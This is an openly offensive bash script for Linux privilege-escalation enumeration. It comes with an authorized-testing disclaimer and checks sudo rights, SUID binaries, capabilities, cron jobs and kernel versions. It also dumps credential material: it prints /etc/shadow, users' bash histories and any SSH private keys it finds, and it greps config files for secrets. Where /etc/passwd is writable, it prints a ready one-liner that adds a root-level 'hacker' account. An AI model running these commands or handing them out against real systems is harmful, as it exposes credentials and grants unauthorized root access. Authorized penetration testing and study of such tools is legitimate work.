#!/bin/bash
#==============================================================================
# Linux Privilege Escalation Checklist
# Usage: ./linux-privesc.sh [output_file]
# Author: Brad Turner
# DISCLAIMER: For authorized security testing only. Do not use against systems
# without explicit written permission. The author assumes no liability for
# misuse. You are responsible for compliance with all applicable laws.
#==============================================================================

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
CYAN='\033[0;36m'
NC='\033[0m'

OUTPUT=${1:-"/tmp/privesc_$(hostname).txt"}

banner() {
    echo -e "\n${BLUE}========================================${NC}"
    echo -e "${GREEN}[*] $1${NC}"
    echo -e "${BLUE}========================================${NC}"
}

info() { echo -e "${GREEN}[+]${NC} $1"; }
warn() { echo -e "${YELLOW}[!]${NC} $1"; }
finding() { echo -e "${RED}[!!!]${NC} $1"; }

# Start logging
exec > >(tee -a "$OUTPUT") 2>&1

banner "SYSTEM INFORMATION"
echo "Hostname: $(hostname)"
echo "Kernel: $(uname -a)"
cat /etc/*release 2>/dev/null | head -5
echo "Architecture: $(uname -m)"

banner "CURRENT USER CONTEXT"
echo "User: $(whoami) (UID: $(id -u))"
id
echo ""
echo "Groups:"
groups

banner "SUDO PERMISSIONS"
info "Checking sudo -l..."
sudo -l 2>/dev/null
if [ $? -eq 0 ]; then
    finding "SUDO permissions found! Check GTFOBins for exploits"
fi

banner "SUID/SGID BINARIES"
info "Finding SUID binaries..."
find / -perm -4000 -type f 2>/dev/null | while read -r bin; do
    echo "$bin"
done
echo ""
info "Finding SGID binaries..."
find / -perm -2000 -type f 2>/dev/null | head -20

# Check for known exploitable SUID binaries
SUID_BINS=$(find / -perm -4000 -type f 2>/dev/null)
for dangerous in bash sh dash python python3 perl ruby nmap vim nano less more awk find cp mv nohup env php node; do
    if echo "$SUID_BINS" | grep -qE "/$dangerous$"; then
        finding "Potentially exploitable SUID: $dangerous (check GTFOBins!)"
    fi
done

banner "CAPABILITIES"
info "Files with capabilities..."
getcap -r / 2>/dev/null | while read -r line; do
    echo "$line"
    if echo "$line" | grep -qE '(cap_setuid|cap_setgid|cap_dac_override|cap_sys_admin)'; then
        finding "Dangerous capability: $line"
    fi
done

banner "CRON JOBS"
info "System crontabs..."
cat /etc/crontab 2>/dev/null
echo ""
info "Cron directories..."
ls -la /etc/cron* 2>/dev/null
echo ""
info "User crontabs..."
for user in $(cut -d: -f1 /etc/passwd); do
    crontab -u "$user" -l 2>/dev/null | grep -v "^#" | grep -v "^$" && echo "  (user: $user)"
done
echo ""
info "Checking for writable cron scripts..."
find /etc/cron* -type f -writable 2>/dev/null && finding "Writable cron file found!"

banner "WRITABLE DIRECTORIES & FILES"
info "World-writable directories..."
find / -type d -perm -o+w 2>/dev/null | grep -vE '(/tmp|/var/tmp|/dev/shm|/run)' | head -20
echo ""
info "Writable files in /etc..."
find /etc -type f -writable 2>/dev/null && finding "Writable file in /etc!"
echo ""
info "Writable /etc/passwd?"
if [ -w /etc/passwd ]; then
    finding "/etc/passwd is WRITABLE! Add user: echo 'hacker:$(openssl passwd -1 password):0:0::/root:/bin/bash' >> /etc/passwd"
fi

banner "PASSWORDS & CREDENTIALS"
info "Checking for password files..."
cat /etc/passwd
echo ""
info "Shadow file readable?"
cat /etc/shadow 2>/dev/null && finding "/etc/shadow is readable!"
echo ""
info "Checking for credentials in common locations..."
find / -name "*.conf" -o -name "*.config" -o -name "*.cfg" 2>/dev/null | xargs grep -liE '(password|passwd|pwd|secret|key|token)' 2>/dev/null | head -20
echo ""
info "Checking bash history files..."
find /home -name ".bash_history" -exec echo "=== {} ===" \; -exec cat {} \; 2>/dev/null
cat /root/.bash_history 2>/dev/null
echo ""
info "Checking .ssh directories..."
find / -name "id_rsa" -o -name "id_dsa" -o -name "id_ecdsa" -o -name "id_ed25519" 2>/dev/null | while read -r key; do
    finding "SSH private key: $key"
    cat "$key" 2>/dev/null
done

banner "NETWORK INFORMATION"
info "Network interfaces..."
ip a 2>/dev/null || ifconfig
echo ""
info "Routing table..."
ip route 2>/dev/null || route -n
echo ""
info "Listening ports..."
ss -tulpn 2>/dev/null || netstat -tulpn
echo ""
info "Established connections..."
ss -tn 2>/dev/null || netstat -tn
echo ""
info "ARP cache (other hosts)..."
arp -a 2>/dev/null || ip neigh

banner "RUNNING PROCESSES"
info "Processes running as root..."
ps aux | grep -E "^root" | grep -vE "(ps aux|grep)" | head -30
echo ""
info "All processes..."
ps aux --forest 2>/dev/null || ps aux

banner "INSTALLED SOFTWARE"
info "Installed packages (looking for exploitable versions)..."
if command -v dpkg &> /dev/null; then
    dpkg -l 2>/dev/null | head -50
elif command -v rpm &> /dev/null; then
    rpm -qa 2>/dev/null | head -50
fi
echo ""
info "Interesting binaries..."
which gcc g++ python python3 perl ruby wget curl nc ncat netcat socat 2>/dev/null

banner "KERNEL EXPLOITS"
KERNEL=$(uname -r)
info "Kernel version: $KERNEL"
warn "Check for kernel exploits:"
warn "  searchsploit linux kernel $(uname -r | cut -d'-' -f1)"
warn "  searchsploit linux kernel $(uname -r | cut -d'.' -f1-2)"

# Common vulnerable kernel versions
case "$KERNEL" in
    2.6.*)
        finding "Kernel 2.6.x - Check: Dirty COW (CVE-2016-5195), Full Nelson, etc."
        ;;
    3.*)
        finding "Kernel 3.x - Check: Dirty COW (CVE-2016-5195), overlayfs exploits"
        ;;
    4.*)
        finding "Kernel 4.x - Check: Dirty COW (CVE-2016-5195) if < 4.8.3"
        ;;
    5.*)
        finding "Kernel 5.x - Check: Dirty Pipe (CVE-2022-0847) if 5.8 <= version < 5.16.11"
        ;;
esac

banner "DOCKER / LXC / CONTAINER"
info "Checking for container environment..."
if [ -f /.dockerenv ]; then
    finding "Running inside Docker!"
    warn "Check for Docker socket: ls -la /var/run/docker.sock"
fi
if grep -q "lxc" /proc/1/cgroup 2>/dev/null; then
    finding "Running inside LXC container!"
fi

banner "INTERNAL SERVICES"
info "Local services on 127.0.0.1..."
ss -tlnp 2>/dev/null | grep "127.0.0.1" || netstat -tlnp 2>/dev/null | grep "127.0.0.1"
warn "Port forward interesting internal services!"

banner "QUICK WINS SUMMARY"
echo ""
warn "=== PRIORITIZED CHECKS ==="
echo "1. sudo -l                    -> GTFOBins"
echo "2. SUID binaries              -> GTFOBins" 
echo "3. Capabilities               -> GTFOBins"
echo "4. Cron jobs (writable?)      -> Path injection"
echo "5. /etc/passwd writable?      -> Add root user"
echo "6. Kernel version             -> Kernel exploits"
echo "7. Internal services          -> Port forward & exploit"
echo "8. Credentials/keys           -> Pivot to other users"
echo ""
info "Results saved to: $OUTPUT"
info "Run linpeas.sh for comprehensive automated scan"

